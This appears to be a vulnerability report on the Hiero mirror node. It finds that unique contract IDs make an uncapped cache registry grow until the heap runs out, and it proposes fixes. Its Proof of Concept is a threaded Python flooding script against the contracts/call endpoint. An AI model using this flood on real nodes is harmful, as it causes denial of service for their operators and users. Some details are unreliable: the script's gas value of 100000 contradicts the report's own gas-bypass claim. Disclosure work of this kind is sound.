### Title
Unbounded `CaffeineCacheManager` Internal Registry Growth via Unique ContractId Flooding in `findStorageBatch()`

### Summary
`ContractStateServiceImpl.findStorageBatch()` calls `cacheManagerSlotsPerContract.getCache(contractId.toString())` for every cache-miss contractId. Spring's `CaffeineCacheManager` stores each unique cache name in an internal `ConcurrentHashMap` (`cacheMap`) that has no eviction mechanism. Because the outer `contractSlotsCache` is bounded at 3,000 entries and evicts old contractIds, the loader is re-invoked for evicted IDs, but the `cacheMap` never shrinks — it accumulates one `CaffeineCache` object per unique contractId ever seen, growing without bound and eventually exhausting heap memory.

### Finding Description

**Code path:**

`ContractStateServiceImpl.findStorageBatch()` — [1](#0-0) 

```java
final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
        contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
```

**Root cause:**

`cacheManagerSlotsPerContract` is a `CaffeineCacheManager` bean configured with `expireAfterAccess=5m,maximumSize=1500`. [2](#0-1) 

The `maximumSize=1500` governs how many *slot keys* each individual per-contract `CaffeineCache` instance may hold — it does **not** bound the number of `CaffeineCache` instances the manager creates. Spring's `CaffeineCacheManager.getCache(name)` stores every new name in an internal `ConcurrentHashMap<String, Cache>` (`cacheMap`) that has no size limit and no eviction. [3](#0-2) 

The outer `contractSlotsCache` is bounded at 3,000 entries. [4](#0-3) 

When a contractId is evicted from the outer cache, the next request for that contractId calls `cacheManagerSlotsPerContract.getCache()` again. For a *previously seen* contractId the manager returns the existing `CaffeineCache` from `cacheMap` (no new allocation). For a *new* contractId it allocates a fresh `CaffeineCache` and inserts it into `cacheMap` permanently. Because `cacheMap` is never pruned, it accumulates one `CaffeineCache` object per unique contractId ever observed, growing monotonically.

**Exploit flow:**

1. Attacker sends HTTP POST `/api/v1/contracts/call` at the global rate limit (500 req/s default) with a rotating set of unique `to` addresses (contract addresses). [5](#0-4) 
2. Each request triggers EVM execution → `ContractStorageReadableKVState.readFromDataSource()` → `ContractStateService.findStorage()` → `findStorageBatch()`. [6](#0-5) 
3. Each unique contractId causes `cacheManagerSlotsPerContract.getCache(contractId.toString())` to insert a new `CaffeineCache` into the manager's internal `cacheMap`.
4. `cacheMap` grows at up to 500 entries/second; after ~33 minutes (~1 M unique IDs) heap is exhausted.

**Why existing checks fail:**

- **Gas throttle bypass:** `ThrottleProperties.scaleGas()` returns `0` for any `gas <= 10_000`. `Bucket.tryConsume(0)` always succeeds, so the gas bucket is never consumed. The attacker is constrained only by the 500 req/s rate limit. [7](#0-6) 
- **Rate limit is global, not per-IP:** A single attacker saturates the 500 req/s budget, preventing legitimate traffic and simultaneously filling the cache. [8](#0-7) 
- **Outer cache bound does not protect inner map:** The `contractSlotsCache` (max 3,000) only limits how many `CaffeineCache` *references* are live in the outer cache; it does not evict entries from `cacheManagerSlotsPerContract.cacheMap`. [9](#0-8) 

### Impact Explanation
Each `CaffeineCache` instance allocated by Caffeine with `maximumSize=1500` carries internal data structures (hash table, timer wheel, etc.) on the order of 1–5 KB even when empty. At 500 unique contractIds/second, 1 million entries accumulate in ~33 minutes, consuming ~1–5 GB of heap. This causes either an `OutOfMemoryError` (hard crash) or sustained full-GC pauses that stall all JVM threads — including the mirror node's transaction ingestion and gossip pipeline — preventing the node from processing or relaying pending transactions.

### Likelihood Explanation
The attack requires no authentication, no privileged access, and no special tooling beyond the ability to send HTTP POST requests to the public `/api/v1/contracts/call` endpoint. The attacker needs only a list of valid contract addresses (publicly available on-chain) and a script that rotates through them. The global rate limit of 500 req/s is reachable from a single host. The attack is repeatable and self-sustaining: once the rate limit is saturated, legitimate traffic is also blocked, amplifying the denial-of-service effect.

### Recommendation
1. **Cap the `cacheManagerSlotsPerContract` registry size:** Replace the dynamic `CaffeineCacheManager` with a fixed-size, eviction-aware structure (e.g., a Caffeine `LoadingCache<EntityId, CaffeineCache>` with `maximumSize` matching `contractSlots.maximumSize`). When an entry is evicted from this outer cache, the inner `CaffeineCache` is also released.
2. **Alternatively, eliminate the per-contract sub-cache:** Flatten the two-level cache into a single `Cache<(contractId, slotKey), value>` with a single bounded Caffeine instance, removing the dynamic cache-name allocation entirely.
3. **Add per-IP rate limiting** upstream (e.g., at the ingress/load-balancer layer) to prevent a single client from monopolising the global 500 req/s budget.
4. **Set a minimum gas floor** in `scaleGas()` so that requests with `gas <= 10_000` are not treated as zero-cost from the gas-bucket perspective.

### Proof of Concept
```python
import requests, threading, itertools

TARGET = "http://<mirror-node>/api/v1/contracts/call"
# Rotate through unique contract addresses (0x...0001, 0x...0002, ...)
def addr(n): return "0x" + hex(n)[2:].zfill(40)

def flood(start, count):
    for i in range(start, start + count):
        payload = {
            "to": addr(i),
            "data": "0x",   # triggers storage read on target contract
            "gas": 100000,
            "estimate": False,
            "block": "latest"
        }
        try:
            requests.post(TARGET, json=payload, timeout=2)
        except Exception:
            pass

# Launch 500 threads, each calling a unique contract address
threads = [threading.Thread(target=flood, args=(i*1000, 1000)) for i in range(500)]
for t in threads: t.start()
for t in threads: t.join()
# Repeat in a loop; monitor mirror-node heap via JMX/metrics for unbounded growth
```

After sustained execution, observe `cacheManagerSlotsPerContract`'s internal `cacheMap` size growing without bound via JMX (`CaffeineCacheManager` MBean) or heap dump analysis, with corresponding heap exhaustion and GC log entries showing full-GC storms.

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L85-90)
```java
    private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
        final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
                contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
        final var wrappedKey = ByteBuffer.wrap(key);
        // Cached slot keys for contract, whose slot values are not present in the contractStateCache
        contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L25-25)
```java
    private String contractSlots = "expireAfterAccess=5m,maximumSize=3000,recordStats";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L39-39)
```java
    private String slotsPerContract = "expireAfterAccess=5m,maximumSize=1500";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L107-112)
```java
    @Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
    CaffeineCacheManager cacheManagerSlotsPerContract() {
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
        return caffeineCacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L35-35)
```java
    private long requestsPerSecond = 500;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L42-47)
```java
    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/state/keyvalue/ContractStorageReadableKVState.java (L41-44)
```java
        return timestamp
                .map(t -> contractStateService.findStorageByBlockTimestamp(
                        entityId, Bytes32.wrap(keyBytes).trimLeadingZeros().toArrayUnsafe(), t))
                .orElse(contractStateService.findStorage(entityId, keyBytes))
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```
